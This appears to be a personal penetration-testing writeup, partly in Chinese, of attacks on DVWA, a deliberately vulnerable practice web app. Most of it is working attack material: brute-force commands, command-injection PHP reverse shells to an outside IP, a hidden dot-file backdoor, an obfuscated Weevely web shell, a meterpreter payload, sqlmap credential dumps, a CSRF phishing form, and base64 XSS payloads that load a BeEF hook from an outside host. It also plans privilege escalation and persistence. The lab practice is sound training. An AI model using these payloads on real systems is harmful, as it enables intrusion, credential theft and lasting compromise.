# GSS DVWA Writeup
This is my writeup for DVWA (Damn Vulnerable Web Application)
> Q: `What is DVWA?`
A: `Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment`

![](https://i.imgur.com/jSp68dL.png)



## Brute Force

### Low
* Burp Suite Intruder - Sniper
  關鍵字篩選成功登入請求
![](https://i.imgur.com/OuIfGLy.png)

    **Usernames:**
    ```sh!
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
    ```
    **Passwords**
    ```sh!
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
    ```

* Hydra
    ```sh!
    hydra -L top-usernames-shortlist.txt -P 10k-most-common.txt -vV digidvwa.azurewebsites.net http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=${PHPSESSID};security=low"
    ```
    
### Medium
伺服器會增加Response的延遲時間，用多執行續可增加效率又不導致過載
`Burp`、`Hydra`指定`Thread` or `Resource Pool`

### High
* Burp Suite Intruder - Cluster Bomb + CSRF Token Grabber
* 需要從request驗證CSRF Token，所以寫Python腳本
requests是I/O Based的，所以用threading
```powershell!
$ poc/brute_force.py
```


## Command Injection
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
Refer - https://github.com/commixproject/commix/wiki/Getting-Shells

### Low
#### 獲取基本信息
用`&&`或`;`銜接指令
```sh
127.0.0.1 && whoami && uname -a && hostname
127.0.0.1 && pwd && echo "\n" && cat /etc/passwd
```
![](https://i.imgur.com/G3AAstv.png)


### Medium
改用 `&`，background cmd

**Commix:**
```bash!
commix -u "https://digidvwa.azurewebsites.net/vulnerabilities/exec/" --cookie="PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=high" --data="ip=127.0.0.1&Submit=Submit" -p "ip" --os="Unix"
```
![](https://i.imgur.com/A7Esz4y.jpg)


### Hard
用`|`，不允許空格，如:`| `
```sh!
127.0.0.1|php%20-r%20%27%24sock%3Dfsockopen%28%22159.89.115.68%22%2C1337%29%3Bpopen%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27
```
**Commix:**
```bash!
commix -u "https://digidvwa.azurewebsites.net/vulnerabilities/exec/" --cookie="PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=high" --data="ip=127.0.0.1&Submit=Submit" -p "ip" --os="Unix" --technique=f --web-root="/var/www/html/"
```
    
#### BackDoor
Simple Backdoor, 檔名前面加上 .，管理員`ls`忘記下`-na`會看不到XD
```sh
echo "<?php $var=shell_exec($_GET['input']); echo $var?>" > .backdoor.php
```

使用方式
```sh
https://digidvwa.azurewebsites.net/jim_lee/.backdoor.php?input=uname%20-a
```

#### Reverse Shell
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

##### 目地
* 可 CRUD /var/www/html/config/config.inc.php
* 上傳WebShell，ETC: Weevely、meterpreter
* 改Layout Page - `dvwa/includes/dvwaPage.inc.php`插入Beef XSS Hook ...etc
* 彈shell後想辦法[提權](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [權限維持](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)

##### Listner: Attacker Side
```sh!
rlwrap -cAr nc -lvnp 1337
```

##### Payload:
使用[RevShells](https://www.revshells.com/)生成
```sh!
127.0.0.1 && php -r '$sock=fsockopen("159.89.115.68",1337);exec("sh <&3 >&3 2>&3");'
```

##### Weevely

由於目標伺服器未裝`wget`、`curl`等工具，
為了減少滲透測試難度，裝自帶多模組的Weevely webshell
好處是可以不指定Listener IP，
允許任何人透過password來連線。


```sh!
weevely generate XD helpme.dat
```

在伺服器寫入檔案
```sh!
cat > helpme.dat << EOF
<?php
$h='";f%^unction%^ %^x($t,$k){$c%^=strlen($k)%^;$l=%^strlen($%^t%^);$o="";for%^($i=0;%^$i<$%^l;){fo%^';
$I='@ob%^_end_c%^lean(%^);$r=@base%^64_enc%^%^ode(@x(@g%^zcompre%^ss($o%^),$k)%^%^);print("%^$p$kh$r$kf");}';
$S='$%^k="444bcb3a%^";$kh%^="3fcf8389%^296c";%^%^$kf="49467%^f27e1%^d6";$%^p="26BD3u%^q7ZJ4%^K%^YWWL';
$M=';@ev%^al(@gzuncompr%^ess(@x(@b%^ase64_%^decode(%^%^$m[1]%^),$k)));%^$o=@ob_%^get_conte%^n%^ts();';
$s='"%^/%^$kh(.%^+)$kf/",@file%^%^%^_get_contents(%^"php://input"%^%^),$m)==1) %^{%^@ob%^_st%^art()';
$T=str_replace('xW','','cxWreaxWtxWe_fxWunxWctixWon');
$U='r($j=0%^;(%^$j<$c&&$i<%^$l);$%^j++,$i++)%^{$o.=$%^t{$i}^%^%^$k{$j};}}ret%^ur%^n%^ $o;}if (@preg%^_match%^(';
$b=str_replace('%^','',$S.$h.$U.$s.$M.$I);
$a=$T('',$b);$a();
?>
EOF
```

有些字串會被clean掉，所以先用Base64 encode後上傳再decode
```sh!
base64 helpme.dat
```

上傳
```sh!
echo '<BASE64_STRING>' > helpme.dat
```

```sh!
base64 --decode helpme.dat > helpme.php
```

進入Weevely Listener
```sh!
weevely 'https://digidvwa.azurewebsites.net/jim_lee/helpme.php' XD
```
使用Weevely自帶模組如`:audit_phpconf`, `:net_curl`、`:file_download`、`:file_upload` ...etc


##### Metasploit Meterpreter

```powershell!
# Generate meterpreter payload
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=159.89.115.68 LPORT=7776 -e php/base64 -f raw > about.php

# 上傳到/jim_lee/
# 瀏覽器訪問/jim_lee/about.php

# Start Listnener
$ msfconsole
$ use multi/handler
$ set payload php/meterpreter/reverse_tcp
$ show options
$ set LHOST 0.0.0.0
$ set LPORT 7776
$ run

# Upgrade to Meterprter Shell
$ bg
$ sessions
$ sessions -u <session_id>
$ sessions <session_id>
```
**好用的模組:**
![](https://i.imgur.com/BsTCXdK.png)


Refer - 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md



## Sql Injection
* Manual

    **payload**: 
    `1' or 1=1#`

    **抓DBMS version**: 
    `1' UNION SELECT 1,@@version#`

    **抓User**: 
    `1' UNION SELECT 1, user()#`

    **抓Hostname**: 
    `1' UNION SELECT 1, @@hostname#`

    **抓目前的DB** 
    `1' UNION SELECT 1,database()#`
    `table_schema,table_name FROM information_schema.tables`

    **列tables**: 
    `1' UNION SELECT 1, table_name FROM information_schema.tables where table_schema='dvwa'#`

    **列table的欄位**: 
    `1' UNION SELECT 1,column_name from information_schema.columns where table_name='users'#`

    **列user table的`user`&`password`**: 
    `1' UNION SELECT user, password from users#`
    ![](https://i.imgur.com/JPg258U.png)

* Sqlmap

    Technique指定`USE` - `Union` & `Stack` & `Error` Based

    ```bash!
    sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli/?id=w&Submit=Submit" -p "id" --cookie "PHPSESSID=n280j97vu4pl3kmv34naghl107; security=low" --threads 10 --dbms="Mysql" --technique=USE --os="Linux" --batch --banner
    ```

    抓基本資訊
    ```bash!
    --banner, --current-user, --current-db
    ```

    抓DB、表、欄位等資訊
    ```bash!
    --dbs, --tables, --columns
    ```

    Get desired columns from users table
    ```java
    -D dvwa -T users -C user, password --dump
    ```

    ![](https://i.imgur.com/wxtXQFX.png)

    彈sql-shell
    ```bash!
    sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli/?id=w&Submit=Submit" -p "id" --cookie "PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=low" --threads 10 --dbms="Mysql" --technique=USE --os="Linux" --sql-shell
    ```
    ![](https://i.imgur.com/rzUXEfy.png)

    Advanced Manual: `sqlmap -hh`
    
### Medium
前端有options限制，intercept request直接丟給後端
```bash!
sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli/" --method="POST" --data="id=1&Submit=Submit" --cookie="PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=medium" --technique=U --dbms="MySql" --os="Linux" -p "id" --threads 10 --batch --banner
```
![](https://i.imgur.com/a3TqohC.png)

### High
Payload同`Low`，只是跳新視窗
**Payload:** `1'OR 1=1#`

**SQLMap:** 
Sqlmap 指定second url : `/vulnerabilities/sqli/session-input.php` 從頁面讀取結果
```bash!
sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli/session-input.php" --method="POST" --data="id=1&Submit=Submit" --cookie="PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=high" --technique=U --dbms="MySql" --os="Linux" -p "id" --threads 5 --level 5 --second-url  "https://digidvwa.azurewebsites.net/vulnerabilities/sqli/" --batch --banner
```


## Sql Injection (Blind)
### Low
**Payload:** 
True: `1' and 1=1#`
False: `1' and 1=0#`
Check if length of DBMS version is 7:
`1' and length(@@version)=7#`
逐一爆破

**Sqlmap:** 
technique指定`BT` - `Boolean & Time Based` Blind

```bash!
sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p "id" --cookie "PHPSESSID=n280j97vu4pl3kmv34naghl107; security=low" --threads 10 --os="Linux" --dbms="Mysql" --technique=BT --banner
# Select version
--sql-query="SELECT version();
```
![](https://i.imgur.com/2321vkY.png)

### Medium
改用POST

```bash!
sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli_blind/" --method="POST" --data="id=1&Submit=Submit" --cookie="PHPSESSID=kd703reithlnjd00mc6goag3a2; security=medium" --technique=BT --dbms="MySql" --os="Linux" -p="id" --threads 10 --banner
```
    
### Hard
彈出新視窗`/vulnerabilities/sqli_blind/cookie-input.php`，將input放入Cookie key: id的value中
供`/vulnerabilities/sqli_blind/`抓取參數並輸出結果
![](https://i.imgur.com/ychO5vM.png)

SqlMap爆破Cookie內的ID即可
指定level 2

```bash!
sqlmap.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=0i3t9fijt3qtlhqtq26umenok1; security=high" -p id --technique=BT --dbms="MySql" --os="Linux" --threads 5 --level 2 --batch --banner
```
    
## CSRF
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md
Refer - https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery

### Low
誘騙使用者點擊網址
```md!
https://digidvwa.azurewebsites.net/vulnerabilities/csrf/?password_new=w&password_conf=w&Change=Change
```

```md!
<img src="https://digidvwa.azurewebsites.net/vulnerabilities/csrf/?password_new=XD&password_conf=XD&Change=Change">
```

可使用縮址服務如`reurl`
```md!
https://reurl.cc/NRRNeQ
```
或者放在HTML中用於釣魚網站
```htmlembedded!
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://digidvwa.azurewebsites.net/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="w" />
      <input type="hidden" name="password&#95;conf" value="w" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

### Medium
搭配Reflected XSS，Referer才不會被擋
**URL:**
`https://digidvwa.azurewebsites.net/vulnerabilities/xss_r/?name=</pre><ScRiPt>new Image().src="https://digidvwa.azurewebsites.net/vulnerabilities/csrf/?password_new=XD&password_conf=XD&Change=Change"</ScRiPt><pre>`

**URL(Encoded):**
`https://digidvwa.azurewebsites.net/vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CScRiPt%3Enew%20Image%28%29.src%3D%22https%3A%2F%2Fdigidvwa.azurewebsites.net%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3DXD%26password_conf%3DXD%26Change%3DChange%22%3C%2FScRiPt%3E%3Cpre%3E%23`

### High
抓CSRF Token
`https://digidvwa.azurewebsites.net/vulnerabilities/xss_r/?name=<img src=x onError=alert(1)></img>`
`document.getElementsByName("user_token")[0].value`

    
## XSS (DOM)
XSSer & **XSSTrike**
### Low
```bash!
python3 xsstrike.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/xss_d/?default=1" --headers "Cookie: PHPS
ESSID=n280j97vu4pl3kmv34naghl107; security=low"
```
![](https://i.imgur.com/jYvWHnq.png)


Payload: `<script>alert("XD")</script>`

### Medium

**Payload** : `https://digidvwa.azurewebsites.net/vulnerabilities/xss_d/?default=English#<script>alert(1);</script>`


### High
Beef XSS Payload: `<img src=x id="dmFyIHg9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7eC5zcmM9Imh0dHA6Ly8xNTkuODkuMTE1LjY4OjMwMDAvaG9vay5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs="; onerror=eval(atob(this.id))>`



## XSS (Reflected)
XSSer & **XSSTrike**
```bash!
python3 xsstrike.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/xss_r/?name=w#" --headers "Cookie: PHPSESSID=n280j97vu4pl3kmv34naghl107; security=high"
```
![](https://i.imgur.com/zfd5uzX.png)


### Low
Payload: `<script>alert(1)</script>`

### Medium
提前結束`<pre>` tag 才能插入`script`
![](https://i.imgur.com/stG8T7D.png)

Pyload: `</pre><ScRiPt>alert(1)</script><pre>`

URL Encoded: `https://digidvwa.azurewebsites.net/vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CScRiPt%3Ealert%281%29%3C%2Fscript%3E%3Cpre%3E`

### High
**Payload:** `<img src=x id="dmFyIHg9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7eC5zcmM9Imh0dHA6Ly8xNTkuODkuMTE1LjY4OjMwMDAvaG9vay5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs="; onerror=eval(atob(this.id))>`


## XSS (Stored)
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

**XSSTrike**
```bash!
python3 xsstrike.py -u "https://digidvwa.azurewebsites.net/vulnerabilities/xss_s/" --data "txtName=w&mtxMessage=w&btnSign=Sign+Guestbook" --headers "Cookie: PHPSESSID=n280j97vu4pl3kmv34naghl107; security=high"
```
![](https://i.imgur.com/RsXsFcn.jpg)


### Low
Payload: `<script>alert(1)</script>`
XSShunter: `<script src=https://bravosec.xss.ht></script>`
### Medium
不會排除script tag大小寫混合
Payload: `<scRipT>alert(1)</scRipT>`
XSShunter: `<scRipT src=https://bravosec.xss.ht></scRipT>`
### High
利用html事件如: `<img src=x onerror=.../>`
Payload: `<img src=x onError=alert('www')/>`
![](https://i.imgur.com/C80CGrB.png)

XSSHunter: `<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnJhdm9zZWMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`

Beef XSS: `<img src=x id="dmFyIHg9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7eC5zcmM9Imh0dHA6Ly8xNTkuODkuMTE1LjY4OjMwMDAvaG9vay5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs="; onerror=eval(atob(this.id))>
`

## Javascript
### Low
Submit時需要手動呼叫`generate_token()`，從`phrase` input tag產生新token

### Medium
```java!
token=XXeMegnahCXX&phrase=ChangeMe&send=Submit
```
Submit時，token是依照phrase用此格式產生的:`XX<phrase reverse string>XX`
先反轉success字串 ->
```py
>>> "success"[::-1]
'sseccus'
```

request data改成 ->
```java!
token=XXsseccusXX&phrase=success&send=Submit
```

### High
透過`high.js`生成token
`high.js`被obfuscate過
使用線上[deobfuscate工具](https://lelinhtinh.github.io/de4js/)
![](https://i.imgur.com/RaT6gzN.png)

複製貼上到Console
![](https://i.imgur.com/SXCmmli.png)

**結果:**
![](https://i.imgur.com/yxiMo6Q.png)




## CSP Bypass
### Low
Content Security Polciy 設定值為:
```java!
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```
Html Render:
![](https://i.imgur.com/oOBE388.png)

允許載入Pastebin上的字串，放入`<script>`
https://pastebin.com/dl/R570EE00

### Medium
Content Security Polciy 設定值為:
```java!
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
```
`unsafe-inline`允許插入`<script>`內容
`<script>` tag內設定`nonce`來符合CSP白名單

**Payload:** 
```html!
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" src='https://pastebin.com/dl/R570EE00'></script>
```

### High
這邊是用jsonp去call function
![](https://i.imgur.com/Ya0Lxai.png)
![](https://i.imgur.com/JrDLA9i.png)
![](https://i.imgur.com/O2MPQcV.png)

把callback改成自己的function
![](https://i.imgur.com/nLOLqsE.png)




## Weak Session IDs
### Low
* Cookie中的`dvwaSession`用+1產生，可隨意竄改
* Cookie不會失效
* Cookie沒有設HTTPONLY flag，可用`document.cookie`存取
![](https://i.imgur.com/G8KDsZ6.png)


### Medium
* Cookie中的`dvwaSession`用timestamp(UTC)產生
* Cookie不會失效
* Cookie沒有設HTTPONLY flag，可用`document.cookie`存取
![](https://i.imgur.com/3UTNNaW.png)


可竄改成指定時間如:`1660198985`
![](https://i.imgur.com/0eDlHAn.png)

### High
**Request:**
```cmd!
Cookie: dvwaSession=c81e728d9d4c2f636f067f89cc14862c; dvwaSession=1660486764; PHPSESSID=b8uh613th2vqk8h7vn0518lgt4; security=high
```
**Response:**
```cmd!
Set-Cookie: dvwaSession=eccbc87e4b5ce2fe28308fd9f2a7baf3; expires=Sun, 14-Aug-2022 15:31:45 GMT; Max-Age=3600; path=/vulnerabilities/weak_id/; domain=digidvwa.azurewebsites.net
```
reverse search md5 hash: [`eccbc87e4b5ce2fe28308fd9f2a7baf3`](https://md5.gromweb.com/?md5=eccbc87e4b5ce2fe28308fd9f2a7baf3)
下一個請求回傳的dvwaSession md5 hash : [`a87ff679a2f3e71d9181a67b7542122c`](https://md5.gromweb.com/?md5=a87ff679a2f3e71d9181a67b7542122c)
分別為`3`、`4`
要偽造下一個session的請求，原始ID會是`5`
![](https://i.imgur.com/GOeSz8L.png)
md5 hash過會變成`e4da3b7fbbce2345d7772b0674a318d5`
偽造請求:
![](https://i.imgur.com/weSqJPz.png)


## File Upload
### Low
可上傳php檔，如webshell
`echo "system($_GET["cmd"])" > ok.php`

### Medium
會檢查副檔名是否為圖片
先將一句話木馬或phpinfo()存到`.png`檔
`echo "<?php phpinfo(); ?>" > exec.png`
上傳時intercept request改檔名為`exec.php`
![](https://i.imgur.com/qxoPywn.png)

### High
因為後端會完整驗證`.png`,`.jpg`
只能以jpg、php的形式上傳檔案
再用file inclusion的漏洞觸發php命令
`echo "<?php phpinfo(); ?>" > exec.php.png`
![](https://i.imgur.com/aogO3Y2.png)
在檔案的Head中，加入`GIF89a;`header來偽裝成gif
再到:
`https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/exec.php.png`
![](https://i.imgur.com/SA6bSS6.png)



## File Inclusion
Refer - https://book.hacktricks.xyz/pentesting-web/file-inclusion
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

### Low
Flag: `https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=../../hackable/flags/fi.php`
LFI: `?page=../../../../../../etc/passwd`
RFI: `?page=https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php`

### Medium
會取代`../`字串
Ipython內，將原payload內的`../`取代為`..././`
因`..././`被伺服器讀取會後轉為 -> `../`
![](https://i.imgur.com/odK2eUH.png)

**LFI:** `https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=..././..././hackable/flags/fi.php`
**Flag 2:** `https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=....//....//....//....//....//etc/passwd`
**RFI:**:
`https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=....//....//....//....//....//etc/passwd`
![](https://i.imgur.com/lixtpTY.png)

### High
* 會過濾掉非`file`開頭

透過RCE得知網站的跟目錄`/var/www/html`
![](https://i.imgur.com/2uBQP9E.png)
用`file:`協定指定路徑
**Payload:** `file:///var/www/html/hackable/flags/fi.php`
**Flag:** `https://digidvwa.azurewebsites.net/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php`

## Captcha Bypass
### Low
經測試後發現，成功驗證captcha後
POST到`/vulnerabilities/captcha/`的data: `step`為2
驗證失敗，`step`為1
intercept request把`step`改成2即可繞過驗證
![](https://i.imgur.com/mgRyMr7.png)


### Medium
成功後，會多出passed_captcha=true這個隱藏的input tag中，跟著request data一起傳出去，一樣只是前端驗證
所以只要把`step`改成`2`，加上`passed_captcha=true`
```c!
step=2&password_new=w&password_conf=w&g-recaptcha-response=&Change=Change&passed_captcha=true
```

### High
